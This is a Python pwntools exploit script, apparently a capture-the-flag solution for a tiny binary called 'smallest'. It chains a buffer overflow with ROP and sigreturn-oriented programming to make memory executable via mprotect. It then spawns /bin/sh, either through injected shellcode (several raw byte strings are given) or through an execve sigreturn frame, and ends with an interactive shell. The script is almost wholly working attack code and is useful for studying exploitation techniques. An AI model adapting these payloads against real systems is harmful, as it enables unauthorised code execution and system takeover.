from pwn import *
import time

local = 1
attach = local & 0
bps = attach & 0
wait = 0
debug = attach & 0 
proc_name = 'smallest'
#socat TCP4-LISTEN:10001,fork EXEC:./ascii
ip = '127.0.0.1' 
port = 10001
io = None
context(os='linux', arch='amd64')
if debug:
	context(log_level='debug')

def wait():
	'''wait while debug and sleep while exploiting'''
	if wait == 1:
		raw_input('continue send?')
	else:
		sleep(1)

def makeio():
    global io 
    if local:
    	io = process(proc_name)
    else:
    	io = remote(ip,port)
def ru(data):
	return io.recvuntil(data)
def rv():
	return io.recv()
def sl(data):
	return io.sendline(data)
def sd(data):
	return io.send(data)
def rl():
	return io.recvline()


def way1():
	# 1.read payload to rsp 0x400028 (shellcode must have less than 5 push)

	#shellcode = asm(shellcraft.amd64.linux.sh(),arch='amd64')
	# not enough stack space
	#shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
	# strange shellcode failed while push
	#shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
	# strange shellcode  success while push
	shellcode = "\x31\xf6\xf7\xe6\x52\x52\x52\x54\x5b\x53\x5f\xc7\x07\x2f\x62\x69\x6e\xc7\x47\x04\x2f\x2f\x73\x68\x40\x75\x04\xb0\x3b\x0f\x05\x31\xc9\xb0\x0b\xcd\x80" 
	payload3 = p64(0x400028) + shellcode
	sd(payload3)
	log.info('finish arrange shellcode')
	
syscallret_addr = 0x4000BE # syscall ; ret
start_addr = 0x4000B0
point_start_addr = 0x400128

def way2():
	attach()
	# 1. use srop to execve('/bin/sh',0,0)
 	frame_execve = SigreturnFrame(kernel='amd64')
	frame_execve.rax = constants.linux.amd64.SYS_execve# 10
	frame_execve.rdi = point_start_addr + 0x18 + 0x98 # rcx 
	frame_execve.rsi = 0
	frame_execve.rdx = 0
	frame_execve.rcx = 0x68732f6e69622f #/bin/sh
	frame_execve.rsp = point_start_addr + 0x18
	frame_execve.rip = syscallret_addr
	payload3 = p64(start_addr) + 'D'*8 + str(frame_execve)
	sd(payload3)
	log.info('finish arrange context frame and return to 0x4000B0')
	
	# ===
	wait()
	payload4 = p64(syscallret_addr).ljust(15,'B')
	log.info('finish call sigreturn and syscall execve')
	sd(payload4)


def attach():
	if attach == 1:
		if bps:
			gdb.attach(pidof(proc_name)[0], open('bps'))
		else:
			gdb.attach(pidof(proc_name)[0])



def pwn():
	'''rop + srop + shellcode'''
	makeio()
	if debug:
		context(os='linux', arch='amd64', log_level='debug')
	# ===
	# 1. use rop in bof and return to 0x4000B0
	# 2. use 'A'*8 to padding for sigreturn addr to be setted next time
	# 3. follow by sys_mprotect context frame to set 0x400000 rwx

	# initialize sys_mprotect frame
	frame = SigreturnFrame(kernel='amd64')
	frame.rax = constants.linux.amd64.SYS_mprotect # 10
	frame.rdi = 0x400000
	frame.rsi = 0x1000
	frame.rdx = 7
	frame.rsp = point_start_addr
	frame.rip = syscallret_addr
	payload1 = p64(start_addr)+ 'A'*8 +str(frame)
	sd(payload1)
	log.info('finish arrange context frame and return to 0x4000B0')

	# ===
	# 1. use read 15 bytes to set eax
	# 2. use 15 syscall to call sigreturn and it will restore the registers saved in context frame
	# 3. use 10 syscall  (mprotect)
	# 4. ret to start
	wait()
	payload2 = p64(syscallret_addr).ljust(15,'B')
	sd(payload2)
	log.info('finish sigreturn and sys_mprotect the binary with rwx permission')
	
	wait()

	way2()
	
	io.interactive()

def pwn1():
	print 12
	# frame = SigreturnFrame(kernel='amd64')
	# frame.rax = constants.linux.amd64.SYS_execve# 10
	# frame.rdi = 0xcccccccccccccccc
	# frame.rsi = 0
	# frame.rdx = 0
	# frame.rcx = 0x2f62696e2f736800
	# frame.rsp = point_start_addr
	# frame.rip = syscallret_addr

	# payload3 = p64(start_addr)+ 'C'*8 +str(frame)
	# sd(payload3) # rop set frame
	# wait()
	# log.info('finish arrange frame and rop')

	# payload4 = p64(syscallret_addr).ljust(15,'B')
	# sd(payload4)
	# log.info('finish eax=15 and call sys_execve')
	# wait()

if __name__ == '__main__':
	pwn()
